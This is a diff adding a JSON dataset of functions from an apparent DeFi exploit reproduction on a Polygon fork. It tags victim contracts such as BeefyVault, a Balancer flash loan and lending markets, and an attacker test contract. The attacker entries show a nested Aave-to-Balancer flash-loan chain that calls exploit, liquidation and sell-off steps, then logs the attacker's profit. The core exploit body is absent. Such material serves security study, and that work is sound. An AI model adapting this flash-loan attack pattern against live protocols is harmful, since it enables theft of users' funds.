@@ -1,0 +1,268 @@
+[
+  {
+    "contract/interface": "BeefyVault",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "BeefyVault",
+    "source_type": "victim_contract",
+    "function_name": "balance",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "BeefyVault",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "BeefyVault",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "BeefyVault",
+    "source_type": "victim_contract",
+    "function_name": "token",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "BeefyVault",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "BeefyVault",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "BeefyVault",
+    "source_type": "victim_contract",
+    "function_name": "withdrawAll",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Liquidator",
+    "source_type": "victim_contract",
+    "function_name": "liquidate",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ILendingPool",
+    "source_type": "victim_contract",
+    "function_name": "flashLoan",
+    "original_code": "    function flashLoan(\n        IFlashLoanRecipient recipient,\n        IERC20[] memory tokens,\n        uint256[] memory amounts,\n        bytes memory userData\n    ) external override nonReentrant whenNotPaused {\n        InputHelpers.ensureInputLengthMatch(tokens.length, amounts.length);\n\n        uint256[] memory feeAmounts = new uint256[](tokens.length);\n        uint256[] memory preLoanBalances = new uint256[](tokens.length);\n\n        // Used to ensure `tokens` is sorted in ascending order, which ensures token uniqueness.\n        IERC20 previousToken = IERC20(0);\n\n        for (uint256 i = 0; i < tokens.length; ++i) {\n            IERC20 token = tokens[i];\n            uint256 amount = amounts[i];\n\n            _require(token > previousToken, token == IERC20(0) ? Errors.ZERO_TOKEN : Errors.UNSORTED_TOKENS);\n            previousToken = token;\n\n            preLoanBalances[i] = token.balanceOf(address(this));\n            feeAmounts[i] = _calculateFlashLoanFeeAmount(amount);\n\n            _require(preLoanBalances[i] >= amount, Errors.INSUFFICIENT_FLASH_LOAN_BALANCE);\n            token.safeTransfer(address(recipient), amount);\n        }\n\n        recipient.receiveFlashLoan(tokens, amounts, feeAmounts, userData);\n\n        for (uint256 i = 0; i < tokens.length; ++i) {\n            IERC20 token = tokens[i];\n            uint256 preLoanBalance = preLoanBalances[i];\n\n            // Checking for loan repayment first (without accounting for fees) makes for simpler debugging, and results\n            // in more accurate revert reasons if the flash loan protocol fee percentage is zero.\n            uint256 postLoanBalance = token.balanceOf(address(this));\n            _require(postLoanBalance >= preLoanBalance, Errors.INVALID_POST_LOAN_BALANCE);\n\n            // No need for checked arithmetic since we know the loan was fully repaid.\n            uint256 receivedFeeAmount = postLoanBalance - preLoanBalance;\n            _require(receivedFeeAmount >= feeAmounts[i], Errors.INSUFFICIENT_FLASH_LOAN_FEE_AMOUNT);\n\n            _payFeeAmount(token, receivedFeeAmount);\n            emit FlashLoan(recipient, token, amounts[i], receivedFeeAmount);\n        }\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IRouter",
+    "source_type": "victim_contract",
+    "function_name": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePool",
+    "source_type": "victim_contract",
+    "function_name": "add_liquidity",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePool",
+    "source_type": "victim_contract",
+    "function_name": "remove_liquidity",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUnitroller",
+    "source_type": "victim_contract",
+    "function_name": "cTokensByUnderlying",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUnitroller",
+    "source_type": "victim_contract",
+    "function_name": "enterMarkets",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUnitroller",
+    "source_type": "victim_contract",
+    "function_name": "exitMarket",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUnitroller",
+    "source_type": "victim_contract",
+    "function_name": "getAccountLiquidity",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IERC20",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Uni_Router_V3",
+    "source_type": "victim_contract",
+    "function_name": "exactInputSingle",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICErc20Delegate",
+    "source_type": "victim_contract",
+    "function_name": "borrow",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICErc20Delegate",
+    "source_type": "victim_contract",
+    "function_name": "liquidateBorrow",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "CErc20Interface",
+    "source_type": "victim_contract",
+    "function_name": "mint",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "CErc20Interface",
+    "source_type": "victim_contract",
+    "function_name": "redeem",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MarketExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MarketExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MarketExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MarketExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MarketExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "executeOperation",
+    "original_code": "    function executeOperation( // Aave callback\n        address[] memory assets,\n        uint256[] memory amounts,\n        uint256[] memory premiums,\n        address initiator,\n        bytes memory params\n    ) external returns (bool) {\n        _balancerFlashLoan();\n\n        WMATIC.approve(address(aaveLendingPool), type(uint256).max); // repay\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MarketExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MarketExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "receiveFlashLoan",
+    "original_code": "    function receiveFlashLoan( // Balancer callback\n        IERC20[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        _exploit();\n        _liquidate();\n        _sellAll();\n\n        // repay\n        stMATIC.transfer(address(balancerVault), 19_664_260 ether);\n        WMATIC.transfer(address(balancerVault), 34_580_036 ether);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MarketExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"https://polygon.llamarpc.com\", 34_716_800); // fork Polygon at block 34716800\n        vm.deal(address(this), 0); // set address(this).balance to 0\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MarketExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MarketExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MarketExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MarketExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MarketExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MarketExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MarketExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "testHack",
+    "original_code": "    function testHack() external {\n        _aaveFlashLoan();\n\n        console.log(\"\\n Attacker's profit:\");\n        console.log(\"stMATIC:\", stMATIC.balanceOf(address(this)) / 1e18);\n        console.log(\"WMATIC:\", WMATIC.balanceOf(address(this)) / 1e18);\n    }\n\n",
+    "description": ""
+  }
+]
